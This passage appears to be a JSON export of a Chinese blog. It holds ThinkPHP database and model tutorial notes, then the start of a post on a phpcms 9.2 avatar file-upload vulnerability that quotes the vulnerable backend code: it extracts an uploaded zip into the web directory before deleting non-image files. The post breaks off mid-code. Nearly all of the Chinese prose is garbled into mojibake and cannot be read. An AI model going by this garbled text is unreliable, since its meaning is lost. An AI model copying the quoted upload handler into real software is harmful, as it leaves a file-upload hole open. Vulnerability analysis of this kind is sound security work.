Db::table(&#39;tp_user&#39;)-&gt;select(); SELECT * FROM `tp_user` å¤šåˆ—æ•°æ®åœ¨æŸ¥è¯¢ä¸åˆ°ä»»ä½•æ•°æ®æ—¶è¿”å›ç©ºæ•°ç»„ï¼Œä½¿ç”¨ selectOrFail()æŠ›å‡ºå¼‚å¸¸ï¼› Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;, 1)-&gt;selectOrFail(); åœ¨ select()æ–¹æ³•åå†ä½¿ç”¨ toArray()æ–¹æ³•ï¼Œå¯ä»¥å°†æ•°æ®é›†å¯¹è±¡è½¬åŒ–ä¸ºæ•°ç»„ï¼› $user = Db::table(&#39;tp_user&#39;)-&gt;select()-&gt;toArray(); dump($user); å½“åœ¨æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­è®¾ç½®äº†å‰ç¼€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ name()æ–¹æ³•å¿½ç•¥å‰ç¼€ï¼› Db::name(&#39;user&#39;)-&gt;select(); ä¸‰ï¼å…¶å®ƒæŸ¥è¯¢ é€šè¿‡ value()æ–¹æ³•ï¼Œå¯ä»¥æŸ¥è¯¢æŒ‡å®šå­—æ®µçš„å€¼ï¼ˆå•ä¸ªï¼‰ï¼Œæ²¡æœ‰æ•°æ®è¿”å› nullï¼› Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, **27**)-&gt;value(&#39;username&#39;); é€šè¿‡ colunm()æ–¹æ³•ï¼Œå¯ä»¥æŸ¥è¯¢æŒ‡å®šåˆ—çš„å€¼ï¼ˆå¤šä¸ªï¼‰ï¼Œæ²¡æœ‰æ•°æ®è¿”å›ç©ºæ•°ç»„ï¼› Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;); å¯ä»¥æŒ‡å®š id ä½œä¸ºåˆ—å€¼çš„ç´¢å¼•ï¼› Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;, &#39;id&#39;); å¦‚æœå¤„ç†çš„æ•°æ®é‡å·¨å¤§ï¼Œæˆç™¾ä¸Šåƒé‚£ç§ï¼Œä¸€æ¬¡æ€§è¯»å–æœ‰å¯èƒ½ä¼šå¯¼è‡´å†…å­˜å¼€é”€è¿‡å¤§ï¼› ä¸ºäº†é¿å…å†…å­˜å¤„ç†å¤ªå¤šæ•°æ®å‡ºé”™ï¼Œå¯ä»¥ä½¿ç”¨ chunk()æ–¹æ³•åˆ†æ‰¹å¤„ç†æ•°æ®ï¼› æ¯”å¦‚ï¼Œæ¯æ¬¡åªå¤„ç† 100 æ¡ï¼Œå¤„ç†å®Œæ¯•åï¼Œå†è¯»å– 100 æ¡ç»§ç»­å¤„ç†ï¼› Db::table(&#39;tp_user&#39;)-&gt;chunk(3, function($users) { foreach ($users as $user) { dump($user); } echo 1; }; å¯ä»¥åˆ©ç”¨æ¸¸æ ‡æŸ¥è¯¢åŠŸèƒ½ï¼Œå¯ä»¥å¤§å¹…åº¦å‡å°‘æµ·é‡æ•°æ®çš„å†…å­˜å¼€é”€ï¼Œå®ƒåˆ©ç”¨äº† PHP ç”Ÿ æˆå™¨ç‰¹æ€§ã€‚æ¯æ¬¡æŸ¥è¯¢åªè¯»ä¸€è¡Œï¼Œç„¶åå†è¯»å–æ—¶ï¼Œè‡ªåŠ¨å®šä½åˆ°ä¸‹ä¸€è¡Œç»§ç»­è¯»å–ï¼› $cursor = Db::table(&#39;tp_user&#39;)-&gt;cursor(); foreach($cursor as $user){ dump($user); } 0x09æ•°æ®åº“çš„é“¾å¼æŸ¥è¯¢ä¸€ï¼æŸ¥è¯¢è§„åˆ™ å‰é¢è¯¾ç¨‹ä¸­æˆ‘ä»¬é€šè¿‡æŒ‡å‘ç¬¦å·â€œ-&gt;â€å¤šæ¬¡è¿ç»­è°ƒç”¨æ–¹æ³•ç§°ä¸ºï¼šé“¾å¼æŸ¥è¯¢ï¼› å½“ Db::name(â€˜userâ€™)æ—¶ï¼Œè¿”å›æŸ¥è¯¢å¯¹è±¡(Query)ï¼Œå³å¯è¿ç¼€æ•°æ®åº“å¯¹åº”çš„æ–¹æ³•ï¼› æ¯æ¬¡æ‰§è¡Œä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢æ–¹æ³•æ—¶ï¼Œæ¯”å¦‚ where()ï¼Œè¿˜å°†è¿”å›æŸ¥è¯¢å¯¹è±¡(Query)ï¼› åªè¦è¿˜æ˜¯æ•°æ®åº“å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¸€ç›´ä½¿ç”¨æŒ‡å‘ç¬¦å·è¿›è¡Œé“¾å¼æŸ¥è¯¢ï¼› å†åˆ©ç”¨ find()ã€select()ç­‰æ–¹æ³•è¿”å›æ•°ç»„(Array)æˆ–æ•°æ®é›†å¯¹è±¡(Colletion)ï¼› è€Œ find()å’Œ select()æ˜¯ç»“æœæŸ¥è¯¢æ–¹æ³•ï¼ˆæ”¾åœ¨æœ€åï¼‰ï¼Œå¹¶ä¸æ˜¯é“¾å¼æŸ¥è¯¢æ–¹æ³•ï¼› Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 27)-&gt;order(&#39;id&#39;, &#39;desc&#39;)-&gt;find() é™¤äº†æŸ¥è¯¢æ–¹æ³•å¯ä»¥ä½¿ç”¨é“¾å¼è¿è´¯æ“ä½œï¼ŒCURD æ“ä½œä¹Ÿå¯ä»¥ä½¿ç”¨ï¼ˆåç»­è¯¾ç¨‹ç ”ç©¶ï¼‰ï¼› é‚£ä¹ˆï¼Œæœ‰å¤šå°‘ç§ç±»ä¼¼ where()çš„é“¾å¼æ“ä½œæ–¹æ³•å‘¢ï¼Ÿæ‰“å¼€æ‰‹å†Œç„ä¸€ä¸‹ã€‚ã€‚ã€‚ äºŒï¼æ›´å¤šæŸ¥è¯¢ å¦‚æœå¤šæ¬¡ä½¿ç”¨æ•°æ®åº“æŸ¥è¯¢ï¼Œé‚£ä¹ˆæ¯æ¬¡é™æ€åˆ›å»ºéƒ½ä¼šç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼Œé€ æˆæµªè´¹ï¼› æˆ‘ä»¬å¯ä»¥æŠŠå¯¹è±¡å®ä¾‹ä¿å­˜ä¸‹æ¥ï¼Œå†è¿›è¡Œåå¤è°ƒç”¨å³å¯ï¼› $userQuery = Db::name(&#39;user&#39;); $dataFind = $userQuery-&gt;where(&#39;id&#39;, 27)-&gt;find(); $dataSelect = $userQuery-&gt;select(); å½“åŒä¸€ä¸ªå¯¹è±¡å®ä¾‹ç¬¬äºŒæ¬¡æŸ¥è¯¢åï¼Œä¼šä¿ç•™ç¬¬ä¸€æ¬¡æŸ¥è¯¢çš„å€¼ï¼› $data1 = $userQuery-&gt;order(&#39;id&#39;, &#39;desc&#39;)-&gt;select(); $data2 = $userQuery-&gt;select(); return Db::getLastSql(); SELECT * FROM tp_user ORDER BY id DESC ä½¿ç”¨ removeOption()æ–¹æ³•ï¼Œå¯ä»¥æ¸…ç†æ‰ä¸Šä¸€æ¬¡æŸ¥è¯¢ä¿ç•™çš„å€¼ï¼› $userQuery-&gt;removeOption(&#39;where&#39;)-&gt;select(); 0x0aæ•°æ®åº“çš„æ•°æ®æ–°å¢ä¸€ï¼å•æ•°æ®æ–°å¢ ä½¿ç”¨ insert()æ–¹æ³•å¯ä»¥å‘æ•°æ®è¡¨æ·»åŠ ä¸€æ¡æ•°æ®ï¼Œæ›´å¤šçš„å­—æ®µé‡‡ç”¨é»˜è®¤ï¼› $data = [ â€˜usernameâ€™ =&gt; â€˜è¾‰å¤œâ€™, â€˜passwordâ€™ =&gt; â€˜123â€™, â€˜genderâ€™ =&gt; â€˜å¥³â€™, â€˜emailâ€™ =&gt; &#39;huiye@163.comâ€˜, â€˜priceâ€™ =&gt; 90, â€˜detailsâ€™ =&gt; â€˜123â€™ ]; Db::name(&#39;user&#39;)-&gt;insert($data); å¦‚æœæ–°å¢æˆåŠŸï¼Œinsert()æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª 1 å€¼ï¼› return Db::name(&#39;user&#39;)-&gt;insert($data); å¦‚æœä½ æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„å­—æ®µæ•°æ®ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ Exceptionï¼› å¦‚æœæƒ³å¼ºè¡Œæ–°å¢æŠ›å¼ƒä¸å­˜åœ¨çš„å­—æ®µæ•°æ®ï¼Œåˆ™ä½¿ç”¨ strick(false)æ–¹æ³•ï¼Œå¿½ç•¥å¼‚å¸¸ï¼› Db::name(&#39;user&#39;)-&gt;strict(false)-&gt;insert($data); å¦‚æœæˆ‘ä»¬é‡‡ç”¨çš„æ•°æ®åº“æ˜¯ mysqlï¼Œå¯ä»¥æ”¯æŒ replace å†™å…¥ï¼› insert å’Œ replace å†™å…¥çš„åŒºåˆ«ï¼Œå‰è€…è¡¨ç¤ºè¡¨ä¸­å­˜åœ¨ä¸»é”®ç›¸åŒåˆ™æŠ¥é”™ï¼Œåè€…åˆ™ä¿®æ”¹ï¼› Db::name(&#39;user&#39;)-&gt;replace()-&gt;insert($data); return Db::getLastSql(); ä½¿ç”¨ insertGetId()æ–¹æ³•ï¼Œå¯ä»¥åœ¨æ–°å¢æˆåŠŸåè¿”å›å½“å‰æ•°æ® IDï¼› return Db::name(&#39;user&#39;)-&gt;insertGetId($data); äºŒï¼æ‰¹é‡æ•°æ®æ–°å¢ ä½¿ç”¨ insertAll()æ–¹æ³•ï¼Œå¯ä»¥æ‰¹é‡æ–°å¢æ•°æ®ï¼Œä½†è¦ä¿æŒæ•°ç»„ç»“æ„ä¸€è‡´ï¼› $data = [ [ â€˜usernameâ€™ =&gt; â€˜è¾‰å¤œâ€™, â€˜passwordâ€™ =&gt; â€˜123 â€˜genderâ€™ =&gt; â€˜å¥³â€™, â€˜emailâ€™ =&gt; &#39;huiye@163.comâ€˜, â€˜priceâ€™ =&gt; 90, â€˜detailsâ€™ =&gt; â€˜123â€™ ], [ â€˜usernameâ€™ =&gt; â€˜è¾‰å¤œâ€™, â€˜passwordâ€™ =&gt; â€˜123â€™, â€˜genderâ€™ =&gt; â€˜å¥³â€™, â€˜emailâ€™ =&gt; &#39;huiye@163.comâ€˜, â€˜priceâ€™ =&gt; 90, â€˜detailsâ€™ =&gt; â€˜123â€™ ] ]; Db::name(&#39;user&#39;)-&gt;insertAll($data); æ‰¹é‡æ–°å¢ä¹Ÿæ”¯æŒ replace()æ–¹æ³•ï¼Œæ·»åŠ åæ”¹å˜æˆ replace intoï¼› Db::name(&#39;user&#39;)-&gt;replace()-&gt;insertAll($data); ä¸‰ï¼save()æ–°å¢ save()æ–¹æ³•æ˜¯ä¸€ä¸ªé€šç”¨æ–¹æ³•ï¼Œå¯ä»¥è‡ªè¡Œåˆ¤æ–­æ˜¯æ–°å¢è¿˜æ˜¯ä¿®æ”¹(æ›´æ–°)æ•°æ®ï¼› save()æ–¹æ³•åˆ¤æ–­æ˜¯å¦ä¸ºæ–°å¢æˆ–ä¿®æ”¹çš„ä¾æ®ä¸ºï¼Œæ˜¯å¦å­˜åœ¨ä¸»é”®ï¼Œä¸å­˜åœ¨å³æ–°å¢ï¼› Db::name(&#39;user&#39;)-&gt;save($data); 0x0bæ•°æ®åº“çš„ä¿®æ”¹åˆ é™¤ä¸€ï¼æ•°æ®ä¿®æ”¹ ä½¿ç”¨ update()æ–¹æ³•æ¥ä¿®æ”¹æ•°æ®ï¼Œä¿®æ”¹æˆåŠŸè¿”å›å½±å“è¡Œæ•°ï¼Œæ²¡æœ‰ä¿®æ”¹è¿”å› 0ï¼› $data = [ â€˜usernameâ€™ =&gt; â€˜æç™½â€™ ]; return Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 38)-&gt;update($data); å¦‚æœä¿®æ”¹æ•°æ®åŒ…å«äº†ä¸»é”®ä¿¡æ¯ï¼Œæ¯”å¦‚ idï¼Œé‚£ä¹ˆå¯ä»¥çœç•¥æ‰ where æ¡ä»¶ï¼› $data = [ â€˜idâ€™ =&gt; 231, â€˜usernameâ€™ =&gt; â€˜æç™½â€™ ]; return Db::name(â€˜userâ€™)-&gt;update($data); å¦‚æœæƒ³è®©ä¸€äº›å­—æ®µä¿®æ”¹æ—¶æ‰§è¡Œ SQL å‡½æ•°æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ exp()æ–¹æ³•å®ç°ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 232) -&gt;exp(â€˜emailâ€™, â€˜UPPER(email)â€™) -&gt;update(); å¦‚æœè¦è‡ªå¢/è‡ªå‡æŸä¸ªå­—æ®µï¼Œå¯ä»¥ä½¿ç”¨ inc/dec æ–¹æ³•ï¼Œå¹¶æ”¯æŒè‡ªå®šä¹‰æ­¥é•¿ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 232) -&gt;inc(â€˜priceâ€™) -&gt;dec(â€˜statusâ€™, 2) -&gt;update(); ä¸€ä¸ªæ›´åŠ ç®€å•ç²—æš´çµæ´»çš„æ–¹å¼ï¼Œä½¿ç”¨::raw()æ–¹æ³•å®ç° 3ï¼Œ4 ç‚¹çš„å†…å®¹ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 232) -&gt;update([ â€˜emailâ€™ =&gt; Db::raw(â€˜UPPER(email)â€™), â€˜priceâ€™ =&gt; Db::raw(â€˜price + 1â€™), â€˜statusâ€™ =&gt; Db::raw(â€˜status - 2â€™) ]); ä½¿ç”¨ save()æ–¹æ³•è¿›è¡Œä¿®æ”¹æ•°æ®ï¼Œè¿™é‡Œå¿…é¡»æŒ‡å®šä¸»é”®æ‰èƒ½å®ç°ä¿®æ”¹åŠŸèƒ½ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 232) -&gt;save([â€˜usernameâ€™=&gt;â€™æé»‘â€™]); 0x0cæ•°æ®åº“çš„æŸ¥è¯¢è¡¨è¾¾å¼ä¸€ï¼æ¯”è¾ƒæŸ¥è¯¢ æŸ¥è¯¢è¡¨è¾¾å¼æ”¯æŒå¤§éƒ¨åˆ†å¸¸ç”¨çš„ SQL è¯­å¥ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š where(â€˜å­—æ®µåâ€™,â€™æŸ¥è¯¢è¡¨è¾¾å¼â€™,â€™æŸ¥è¯¢æ¡ä»¶â€™); åœ¨æŸ¥è¯¢æ•°æ®è¿›è¡Œç­›é€‰æ—¶ï¼Œæˆ‘ä»¬é‡‡ç”¨ where()æ–¹æ³•ï¼Œæ¯”å¦‚ id=80ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™, 80)-&gt;find(); Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™=â€™,80)-&gt;find(); ä½¿ç”¨&lt;&gt;ã€&gt;ã€&lt;ã€&gt;=ã€&lt;=å¯ä»¥ç­›é€‰å‡ºå„ç§ç¬¦åˆæ¯”è¾ƒå€¼çš„æ•°æ®åˆ—è¡¨ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™&lt;&gt;â€™,80)-&gt;select(); äºŒï¼åŒºé—´æŸ¥è¯¢ ä½¿ç”¨ like è¡¨è¾¾å¼è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜emailâ€™,â€™likeâ€™,â€™xiao%â€™)-&gt;select(); like è¡¨è¾¾å¼è¿˜å¯ä»¥æ”¯æŒæ•°ç»„ä¼ é€’è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜emailâ€™,â€™likeâ€™,[â€˜xiao%â€™,â€™wu%â€™], â€˜orâ€™)-&gt;select(); SELECT * FROM tp_user WHERE (email LIKE â€˜xiao%â€™ OR email LIKE â€˜wu%â€™) like è¡¨è¾¾å¼å…·æœ‰ä¸¤ä¸ªå¿«æ·æ–¹å¼ whereLike()å’Œ whereNoLike()ï¼› Db::name(â€˜userâ€™)-&gt;whereLike(â€˜emailâ€™,â€™xiao%â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereNotLike(â€˜emailâ€™,â€™xiao%â€™)-&gt;select(); between è¡¨è¾¾å¼å…·æœ‰ä¸¤ä¸ªå¿«æ·æ–¹å¼ whereBetween()å’Œ whereNotBetween()ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™betweenâ€™,â€™19,25â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™betweenâ€™,[19, 25])-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereBetween(â€˜idâ€™,â€™19,25â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereNotBetween(â€˜idâ€™,â€™19,25â€™)-&gt;select(); in è¡¨è¾¾å¼å…·æœ‰ä¸¤ä¸ªå¿«æ·æ–¹å¼ whereIn()å’Œ whereNotIn()ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™inâ€™, â€˜19,21,29â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™inâ€™, [19, 21, 29])-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereIn(â€˜idâ€™,â€™19,21,29â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereNotIn(â€˜idâ€™,â€™19,21,29â€™)-&gt;select(); null è¡¨è¾¾å¼å…·æœ‰ä¸¤ä¸ªå¿«æ·æ–¹å¼ whereNull()å’Œ whereNotNull()ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜uidâ€™,â€™nullâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;where(â€˜uidâ€™,â€™not nullâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereNull(â€˜uidâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereNotNull(â€˜uidâ€™)-&gt;select(); ä¸‰ï¼EXP æŸ¥è¯¢ ä½¿ç”¨ exp å¯ä»¥è‡ªå®šä¹‰å­—æ®µåçš„ SQL è¯­å¥ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜idâ€™,â€™expâ€™,â€™IN (19,21,25)â€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereExp(â€˜idâ€™,â€™IN (19,21,25)â€™)-&gt;select() 0x0dæ•°æ®åº“çš„æ—¶é—´æŸ¥è¯¢ä¸€ï¼ä¼ ç»Ÿæ–¹å¼ å¯ä»¥ä½¿ç”¨&gt;ã€&lt;ã€&gt;=ã€&lt;=æ¥ç­›é€‰åŒ¹é…æ—¶é—´çš„æ•°æ®ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜create_timeâ€™, â€˜&gt;â€™, â€˜2018-1-1â€™)-&gt;select(); å¯ä»¥ä½¿ç”¨ between å…³é”®å­—æ¥è®¾ç½®æ—¶é—´çš„åŒºé—´ï¼› Db::name(â€˜userâ€™)-&gt;where(â€˜create_timeâ€™, â€˜betweenâ€™, [â€˜2018-1-1â€™, â€˜2019-12-31â€™])-&gt;select(); Db::name(â€˜userâ€™)-&gt;where(â€˜create_timeâ€™, â€˜not betweenâ€™, [â€˜2018-1-1â€™, â€˜2019-12-31â€™])-&gt;select(); äºŒï¼å¿«æ·æ–¹å¼ æ—¶é—´æŸ¥è¯¢çš„å¿«æ·æ–¹æ³•ä¸º whereTime()ï¼Œç›´æ¥ä½¿ç”¨&gt;ã€&lt;ã€&gt;=ã€&lt;=ï¼› Db::name(â€˜userâ€™)-&gt;whereTime(â€˜create_timeâ€™, â€˜&gt;â€™, â€˜2018-1-1â€™)-&gt;select(); å¿«æ·æ–¹å¼ä¹Ÿå¯ä»¥ä½¿ç”¨ between å’Œ not betweenï¼› Db::name(â€˜userâ€™)-&gt;whereBetween(â€˜create_timeâ€™, [â€˜2018-1-1â€™, â€˜2019-12-31â€™])-&gt;select(); è¿˜æœ‰ä¸€ç§å¿«æ·æ–¹å¼ä¸ºï¼šwhereBetweenTime()å’Œ whereNotBetweenTime()ï¼› Db::name(â€˜userâ€™)-&gt;whereBetweenTime(â€˜create_timeâ€™, â€˜2018-1-1â€™, â€˜2019-12-31â€™)-&gt;select(); é»˜è®¤çš„å¤§äº&gt;ï¼Œå¯ä»¥çœç•¥ï¼› Db::name(â€˜userâ€™)-&gt;whereTime(â€˜create_timeâ€™, â€˜2018-1-1â€™)-&gt;select(); ä¸‰ï¼å›ºå®šæŸ¥è¯¢ ä½¿ç”¨ whereYear æŸ¥è¯¢ä»Šå¹´çš„æ•°æ®ã€å»å¹´çš„æ•°æ®å’ŒæŸä¸€å¹´çš„æ•°æ® Db::name(â€˜userâ€™)-&gt;whereYear(â€˜create_timeâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereYear(â€˜create_timeâ€™, â€˜last yearâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereYear(â€˜create_timeâ€™, â€˜2016â€™)-&gt;select(); ä½¿ç”¨ whereMonth æŸ¥è¯¢å½“æœˆçš„æ•°æ®ã€ä¸Šæœˆçš„æ•°æ®å’ŒæŸä¸€ä¸ªæœˆçš„æ•°æ®ï¼› Db::name(â€˜userâ€™)-&gt;whereMonth(â€˜create_timeâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereMonth(â€˜create_timeâ€™, â€˜last monthâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereMonth(â€˜create_timeâ€™, â€˜2016-6â€™)-&gt;select(); ä½¿ç”¨ whereDay æŸ¥è¯¢ä»Šå¤©çš„æ•°æ®ã€æ˜¨å¤©çš„æ•°æ®å’ŒæŸä¸€ä¸ªå¤©çš„æ•°æ®ï¼› Db::name(â€˜userâ€™)-&gt;whereDay(â€˜create_timeâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereDay(â€˜create_timeâ€™, â€˜last dayâ€™)-&gt;select(); Db::name(â€˜userâ€™)-&gt;whereDay(â€˜create_timeâ€™, â€˜2016-6-27â€™)-&gt;select(); å››ï¼å…¶å®ƒæŸ¥è¯¢ æŸ¥è¯¢æŒ‡å®šæ—¶é—´çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸¤å°æ—¶å†…çš„ï¼› Db::name(â€˜userâ€™)-&gt;whereTime(â€˜create_timeâ€™, â€˜-2 hoursâ€™)-&gt;select(); æŸ¥è¯¢ä¸¤ä¸ªæ—¶é—´å­—æ®µæ—¶é—´æœ‰æ•ˆæœŸçš„æ•°æ®ï¼Œæ¯”å¦‚ä¼šå‘˜å¼€å§‹åˆ°ç»“æŸçš„æœŸé—´ï¼› Db::name(â€˜userâ€™)-&gt;whereBetweenTimeField(â€˜start_timeâ€™, â€˜end_timeâ€™)-&gt;select(); 0x10æ¨¡å‹çš„å®šä¹‰æ–¹å¼ä¸€ï¼å®šä¹‰æ¨¡å‹ å®šä¹‰ä¸€ä¸ªå’Œæ•°æ®åº“è¡¨å‘åŒ¹é…çš„æ¨¡å‹ï¼› class User extends Model æ¨¡å‹ä¼šè‡ªåŠ¨å¯¹åº”æ•°æ®è¡¨ï¼Œå¹¶ä¸”æœ‰ä¸€å¥—è‡ªå·±çš„å‘½åè§„åˆ™ï¼› æ¨¡å‹ç±»éœ€è¦å»é™¤è¡¨å‰ç¼€(tp_)ï¼Œé‡‡ç”¨é©¼å³°å¼å‘½åï¼Œå¹¶ä¸”é¦–å­—æ¯å¤§å†™ï¼› tp_user(è¡¨å) =&gt; User tp_user_type(è¡¨å) =&gt; UserType åˆ›å»ºç©ºæ¨¡å‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å™¨è°ƒç”¨ï¼Œåˆ›å»ºæ§åˆ¶å™¨ DataModel.phpï¼› å¯ä»¥ç›´æ¥ä½¿ç”¨æ¨¡å‹çš„åç§° User::*è°ƒç”¨æŸ¥è¯¢æ–¹æ³•ï¼Œæ¯”å¦‚ select()ç­‰ï¼› å¦‚æœæ²¡æœ‰ä»£ç æç¤ºï¼Œè¯·å’Œä¸Šä¸€èŠ‚ä¸€æ ·ï¼ŒæŠŠ 5.1 çš„æ³¨é‡Šå¤åˆ¶è¿‡æ¥ï¼› class DataModel { public function index() { return json(User::**select**()); } } å¦‚æœæ‹…å¿ƒè®¾ç½®çš„æ¨¡å‹ç±»åå’Œ PHP å…³é”®å­—å†²çªï¼Œå¯ä»¥å¼€å¯åº”ç”¨ç±»åç¼€ï¼› æ¯”å¦‚è®¾ç½®ï¼šClass UserModel è¿™ç§ï¼Œéœ€è¦æ›´æ”¹æ–‡ä»¶åä¸º UserModel.phpï¼› ç„¶åè®¾ç½®ä¸€ä¸‹$name å±æ€§ä¸ºæŒ‡å®š user(è¡¨å)å³å¯å®ç°ï¼› class UserModel extends Model { protected $name = &#39;user&#39;; } äºŒï¼è®¾ç½®æ¨¡å‹ é»˜è®¤ä¸»é”®ä¸º idï¼Œä½ å¯ä»¥è®¾ç½®å…¶å®ƒä¸»é”®ï¼Œæ¯”å¦‚ uidï¼› protected $pk = â€˜uidâ€™; ä»æ§åˆ¶å™¨ç«¯è°ƒç”¨æ¨¡å‹æ“ä½œï¼Œå¦‚æœå’Œæ§åˆ¶å™¨ç±»åé‡å¤ï¼Œå¯ä»¥è®¾ç½®åˆ«åï¼› use app\\model\\User as UserModel; åœ¨æ¨¡å‹å®šä¹‰ä¸­ï¼Œå¯ä»¥è®¾ç½®å…¶å®ƒçš„æ•°æ®è¡¨ï¼› protected $table = â€˜tp_oneâ€™; æ¨¡å‹å’Œæ§åˆ¶å™¨ä¸€æ ·ï¼Œä¹Ÿæœ‰åˆå§‹åŒ–ï¼Œåœ¨è¿™é‡Œå¿…é¡»è®¾ç½® static é™æ€æ–¹æ³•ï¼› //æ¨¡å‹åˆå§‹åŒ– protected static function init() { //ç¬¬ä¸€æ¬¡å®ä¾‹åŒ–çš„æ—¶å€™æ‰§è¡Œ init echo &#39;åˆå§‹åŒ– User æ¨¡å‹&#39;; }","categories":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://pp1ove.gitee.io/categories/thinkphp/"}],"tags":[{"name":"å¼€å‘æ¡†æ¶","slug":"å¼€å‘æ¡†æ¶","permalink":"https://pp1ove.gitee.io/tags/å¼€å‘æ¡†æ¶/"}],"keywords":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://pp1ove.gitee.io/categories/thinkphp/"}]},{"title":"phpcms9.2æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"phpcms9-2æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2021-02-02T08:34:49.000Z","updated":"2021-02-02T08:59:32.029Z","comments":false,"path":"2021/02/02/phpcms9-2æ–‡ä»¶ä¸Šä¼ æ¼æ´/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/02/phpcms9-2æ–‡ä»¶ä¸Šä¼ æ¼æ´/","excerpt":"","text":"å‰ç«¯æ“ä½œ è¿™é‡Œåœ¨å‰ç«¯,ä¼šå°†æˆ‘ä»¬çš„å¤´åƒåˆ†æˆå››ä¸ªå¤§å°ï¼Œæ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©åŒ…,ç„¶åäº¤ç»™åå°å¤„ç† åç«¯ä»£ç  /** * ä¸Šä¼ å¤´åƒå¤„ç† * ä¼ å…¥å¤´åƒå‹ç¼©åŒ…ï¼Œè§£å‹åˆ°æŒ‡å®šæ–‡ä»¶å¤¹ååˆ é™¤éå›¾ç‰‡æ–‡ä»¶ */ public function uploadavatar() { //æ ¹æ®ç”¨æˆ·idåˆ›å»ºæ–‡ä»¶å¤¹ if(isset($this-&gt;data[&#39;uid&#39;]) &amp;&amp; isset($this-&gt;data[&#39;avatardata&#39;])) { //avatardataä¸ºæ–‡ä»¶å†…å®¹ $this-&gt;uid = $this-&gt;data[&#39;uid&#39;]; $this-&gt;avatardata = $this-&gt;data[&#39;avatardata&#39;]; } else { exit(&#39;0&#39;); } $dir1 = ceil($this-&gt;uid / 10000); $dir2 = ceil($this-&gt;uid % 10000 / 1000); //åˆ›å»ºå›¾ç‰‡å­˜å‚¨æ–‡ä»¶å¤¹ $avatarfile = pc_base::load_config(&#39;system&#39;, &#39;upload_path&#39;).&#39;avatar/&#39;; $dir = $avatarfile.$dir1.&#39;/&#39;.$dir2.&#39;/&#39;.$this-&gt;uid.&#39;/&#39;; if(!file_exists($dir)) { mkdir($dir, 0777, true); } //å­˜å‚¨flashpostå›¾ç‰‡ $filename = $dir.$this-&gt;uid.&#39;.zip&#39;; file_put_contents($filename, $this-&gt;avatardata); //$filename=1.zip //è§£å‹ç¼©æ–‡ä»¶ pc_base::load_app_class(&#39;pclzip&#39;, &#39;phpsso&#39;, 0); $archive = new PclZip($filename); if ($archive-&gt;extract(PCLZIP_OPT_PATH, $dir) == 0) { die(&quot;Error : &quot;.$archive-&gt;errorInfo(true)); } //åˆ¤æ–­æ–‡ä»¶å®‰å…¨ï¼Œåˆ é™¤å‹ç¼©åŒ…å’Œéjpgå›¾ç‰‡ $avatararr = array(&#39;180x180.jpg&#39;, &#39;30x30.jpg&#39;, &#39;45x45.jpg&#39;, &#39;90x90.jpg&#39;); if($handle = opendir($dir)) { //æ‰“å¼€æ–‡ä»¶ä¿å­˜ç›®å½• while(false !== ($file = readdir($handle))) { //åˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶,$fileä¸ºæ–‡ä»¶åæ•°ç»„ if($file !== &#39;.&#39; &amp;&amp; $file !== &#39;..&#39;) { if(!in_array($file, $avatararr)) { //å¦‚æœæ–‡ä»¶åä¸åˆæ³•,åˆ™åˆ 